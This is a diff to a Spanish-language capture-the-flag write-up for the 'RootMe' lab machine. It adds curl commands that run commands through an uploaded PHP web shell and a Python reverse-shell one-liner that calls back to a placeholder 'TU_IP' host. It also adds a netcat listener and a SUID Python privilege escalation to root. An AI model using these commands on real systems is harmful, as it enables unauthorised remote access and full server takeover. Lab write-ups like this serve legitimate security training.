@@ -98,4 +98,55 @@ Modificando el nombre del archivo en el encabezado `Content-Disposition` a `shel
  system($_GET["cmd"]);
 ?>
 ```
-Este script permite ejecutar comandos del sistema en el servidor al pasar el parámetro `"cmd"` en la URL. La exitosa respuesta confirma que el servidor acepta y ejecuta archivos con la extensión .php5.
+Este script permite ejecutar comandos del sistema en el servidor al pasar el parámetro `"cmd"` en la URL. 
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/ce463ba3-54d7-499e-b1e5-2672aaed54df'/>
+</p>
+La respuesta confirma que el servidor acepta y ejecuta archivos con la extensión .php5. El script `shellico.php5` lo buscamos en el directorio `/uploads` encontrado con `wfuzz`
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/77981ebd-7acc-4849-8af7-8200f0060ba4'/>
+</p>
+Usar `curl` para verificar si el parametro cmd funciona y nos hace un RCE
+
+```
+curl http://10.10.244.159/uploads/shellico.php5?cmd=whoami
+www-data
+
+curl http://10.10.244.159/uploads/shellico.php5?cmd=which%20python3
+/usr/bin/python3
+```
+
+Los comandos se están ejecutando corectamente, verificamos con `whoami` quien es el usuario del servidor web `www-data`, muy típico en entornos Apache. Luego, se verifica si Python 3 está instalado en el servidor, lo que podría ser útil para obtener una `reverse shell`.
+
+Hay que establecer una `Reverse shell` para obtener un acceso más completo al sistema. Usamos este comando en Python que crea nos da una `reverse shell` desde el servidor comprometido hacia mi máquina
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TU_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
+Enviaremos el payload través de `Burp Suite` y nos colocaremos en escucha con `netcat`, el payload que contiene la reverse shell la vamos a url-encodear para evitar posibles conflictos.
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/716a5978-237e-4a78-9b03-8e7897fe5c84'/>
+</p>
+
+```
+nc -nlvp port
+
+$ whoami
+whoami
+www-data
+```
+
+La reverse shell se establecio exitosamente. Esto nos da un acceso interactivo al servidor, lo que permite obtener la primera `flag` y la posibilidad de `escalar privilegios` para obtener el usuario `root` y tener control total sobre el sistema.
+
+Después de establecer una `reverse shell` y configurar un entorno de trabajo más cómodo utilizando una TTY interactiva. Con `find` intentare buscar un binario con permisos `SUID` 
+```
+find / -type f -perm -4000 2>/dev/null
+
+```
+Usando [gtfobins](https://gtfobins.github.io/gtfobins/python/#suid) que es una excelente web para encontrar métodos de explotación de binarios comunes con SUID. Usamos este comando ejecuta una shell (/bin/sh) con privilegios elevados gracias al SUID de Python, sin perder los privilegios de root.
+
+```
+www-data@rootme:/var/www$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# whoami
+root
+```
+Ya tengo acceso como usuario `root`, completando así la escalada de privilegios de manera exitosa y obtienendo la ultima `flag` de la maquina RootMe
